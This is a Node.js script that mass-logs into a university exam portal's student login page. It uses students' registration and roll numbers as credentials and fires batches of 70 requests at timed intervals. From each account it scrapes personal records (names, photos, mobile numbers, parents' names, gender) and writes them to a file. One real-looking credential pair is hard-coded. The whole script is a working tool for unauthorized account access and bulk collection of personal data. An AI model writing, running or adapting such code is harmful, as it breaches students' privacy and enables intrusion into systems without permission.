const rp = require('request-promise');
const cheerio = require('cheerio')
const axios = require('axios');
var tough = require('tough-cookie');
let students = {}
console.log(students)
let arr = require('./dataArr_bscNonMed.js')
let fs = require('fs');

fs.writeFile('./data.js', "module.exports = [", function(err){
      if(err) throw err;
})

var XMLHttpRequest = require("xmlhttprequest").XMLHttpRequest;

arr = arr.filter(e => e.RollNo && e.RegdNo)

let studentArr = arr.map (e => {
  return {
    password: e.RollNo.replace(/\s/g,''),
    userId : e.RegdNo.replace(/\s/g,'')
  }
})

console.log(studentArr)

let headers = {

    "Host": "exam.pupadmissions.ac.in",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
    "Content-Type": "application/x-www-form-urlencoded",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "no-cache, no-store"
}

let header2 = {
    "Host": "exam.pupadmissions.ac.in",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    // "Accept-Language": "en-US,en;q=0.5",
    // "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

let body = {
    "__EVENTTARGET": "student",
    "__EVENTARGUMENT": "",
    "__VIEWSTATE": "",
    "__VIEWSTATEGENERATOR": "",
    "EVENTVALIDATION": "",
    "txt_userid": "",
    "txt_pwd": "",
    "txt_username_o": "",
    "txt_pwd_o": "",
    "StuUID": "714-17-514",
    "StuPwd": "9901",
    "btnStuLogin": "Login"
}

let header3 = {
    "Cache-Control": "max-age=1500",
    "Host": "exam.pupadmissions.ac.in",
    // "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:67.0) Gecko/20100101 Firefox/67.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    // "Accept-Language": "en-US,en;q=0.5",
    // "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}
let i = 0

function getPromiseArr(length){
    let arr = [];
    for(let i = 0 ; i< length; i++){
        
       arr.push( rp({
            method: "get",
            uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
            headers: header2
        }).catch(err => console.log(err)))
    }
    return arr;
}





let intervalId = setInterval(()=> {
    if(i >= studentArr.length) clearInterval(intervalId)
    let promises = getPromiseArr(70);
    Promise.all(promises).then(resArr => {
    resArr.forEach((e) => {
        body["StuUID"] = studentArr[i]?studentArr[i].userId:"";
        body["StuPwd"] = studentArr[i]?studentArr[i].password:"";
        if(studentArr[i]) main(e, {...body}, i)
        i++;
        
        console.log(i, studentArr.length, studentArr[i])
    })
})
},15000)



function main(res, body, index) {
            let headers_temp = {...headers}, header2_temp = {...header2}, header3_temp = {...header3}
            // let headers = {...headers}, header2 = {...header2}, header3 = {...header3}
            let $ = cheerio.load(res);
            let eventValidation = $("input#__EVENTVALIDATION").prop("value"),
                viewStateGenerator = $("input#__VIEWSTATEGENERATOR").prop("value"),
                viewState = $("input#__VIEWSTATE").prop("value");

            body["__EVENTVALIDATION"] = eventValidation;
            body["__VIEWSTATEGENERATOR"] = viewStateGenerator;
            body["__VIEWSTATE"] = viewState;


            // console.log(body=toUrlEncoded(body))
            // console.log(body)
            rp({
                    method: "POST",
                    uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
                    headers: headers_temp,
                    form: body,
                    resolveWithFullResponse: true,
                })
                .then(d => {
                    console.log(d.statusCode)
                    studentArr.push(studentArr[index])
                    // extractData(d);
                })
                .catch(err => {
                    let headers2 = err.response.headers;

                    let Cookie = headers2['set-cookie'][0].split(';')[0];
                    header3_temp['Cookie'] = Cookie
                    
                    rp({
                            uri: "https://exam.pupadmissions.ac.in/Examination_Form/LoginCollege.aspx",
                            headers: header3_temp,
                            method: "post",
                            form: body
                        })
                        .then(res => extractData(res))
                        .catch(e => console.log("caychedddakajdkajskdjsakdjsakl"))
                })


    function extractData(data) {
        // console.log(data)

        let $ = cheerio.load(data);
        let rollno = $("#lblRollNo").text();
        let obj = {
            rollno: rollno,
            image: $("#Image1").prop("src"),
            name: $("#lblApp_Name").text(),
            registration: $("#lblRegNo").text(),
            mobile: $("#lblApp_MobileNo").text(),
            id: $("#LblId").text(),
            batch: $("#LblClass").text(),
            father: $("#lblApp_FatherName").text(),
            mother: $("#lblApp_MotherName").text(),
            gender: $("#lblApp_Gender").text(),
        }
        console.log(rollno, obj.name, obj.mobile)
        if(!rollno) studentArr.push(studentArr[index])
        writeFile(obj)
    }

    let toUrlEncoded = obj => Object.keys(obj).map(k => encodeURIComponent(k) + '=' + encodeURIComponent(obj[k])).join('&');
}
function writeFile(data){
    let string = JSON.stringify(data) + ","
    fs.appendFile('./data.js', string, function(err){
      if(err) throw err;
    })
}

